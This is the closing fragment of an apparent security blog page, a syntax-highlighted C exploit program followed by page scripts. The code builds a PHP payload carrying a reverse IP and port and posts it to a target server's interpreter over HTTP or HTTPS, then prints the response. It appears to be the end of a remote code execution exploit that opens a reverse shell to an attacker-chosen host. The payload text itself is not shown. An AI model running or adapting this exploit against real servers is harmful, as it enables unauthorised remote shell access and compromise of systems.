<span class="o">&gt;</span>    <span class="n">tmpsize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">phpstr</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">reverseip</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">reverseportstr</span><span class="p">)</span> <span class="o">+</span> <span class="mi">64</span><span class="p">;</span>
<span class="o">&gt;</span>    <span class="n">tmpstr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">tmpsize</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
<span class="o">&gt;</span>    <span class="n">snprintf</span><span class="p">(</span><span class="n">tmpstr</span><span class="p">,</span> <span class="n">tmpsize</span><span class="p">,</span> <span class="n">phpstr</span><span class="p">,</span> <span class="n">reverseip</span><span class="p">,</span> <span class="n">reverseport</span><span class="p">);</span>
<span class="o">&gt;</span>    
<span class="o">&gt;</span>    <span class="n">writesize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">interpreter</span><span class="p">)</span> <span class="o">+</span> 
<span class="o">&gt;</span>      <span class="n">strlen</span><span class="p">(</span><span class="n">poststr</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">tmpstr</span><span class="p">)</span> <span class="o">+</span> <span class="mi">64</span><span class="p">;</span>
<span class="o">&gt;</span>    <span class="n">writestr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">writesize</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
<span class="o">&gt;</span>    <span class="n">snprintf</span><span class="p">(</span><span class="n">writestr</span><span class="p">,</span> <span class="n">writesize</span><span class="p">,</span> <span class="n">poststr</span><span class="p">,</span> <span class="n">interpreter</span><span class="p">,</span>
<span class="o">&gt;</span>      <span class="n">target</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">tmpstr</span><span class="p">),</span> <span class="n">tmpstr</span><span class="p">);</span>
<span class="o">&gt;</span>   
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">httpsflag</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">writestr</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">writestr</span><span class="p">));</span>
<span class="o">&gt;</span>      <span class="n">readbuf</span> <span class="o">=</span> <span class="n">read_</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">SSL_write</span><span class="p">(</span><span class="n">sslconnection</span><span class="o">-&gt;</span><span class="n">handle</span><span class="p">,</span> <span class="n">writestr</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">writestr</span><span class="p">));</span>
<span class="o">&gt;</span>      <span class="n">readbuf</span> <span class="o">=</span> <span class="n">sslread</span><span class="p">(</span><span class="n">sslconnection</span><span class="p">);</span>
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>   
<span class="o">&gt;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">readbuf</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>      <span class="n">printf</span><span class="p">(</span><span class="s">"***SERVER RESPONSE***</span><span class="se">\n\n</span><span class="s">%s</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">readbuf</span><span class="p">);</span>  
<span class="o">&gt;</span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="o">&gt;</span>     <span class="n">printf</span><span class="p">(</span><span class="s">"read error (15)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>    
<span class="o">&gt;</span>    <span class="p">}</span>
<span class="o">&gt;</span>   <span class="p">}</span>
<span class="o">&gt;</span>   <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span> <span class="p">}</span>
<span class="o">&gt;</span> </code></pre></figure>


</article>

        </main>
      </div>
    </div>
    <script src="https://use.fontawesome.com/c4419a3c1c.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script>window.jQuery || document.write('<\script src="/blog/js/vendor/jquery-1.11.2.min.js"><\/script>')</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/fast-xml-parser/3.12.16/parser.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/fast-xml-parser/3.12.16/parser.min.js.map"></script>
<script src="/blog/js/vendor/bootstrap.min.js"></script>
<script src="/blog/js/main.js"></script>
<script>$(function () { $('[data-toggle="tooltip"]').tooltip() });$(function () { $('[data-toggle="popover"]').popover() });</script>


    

  </body>
</html>
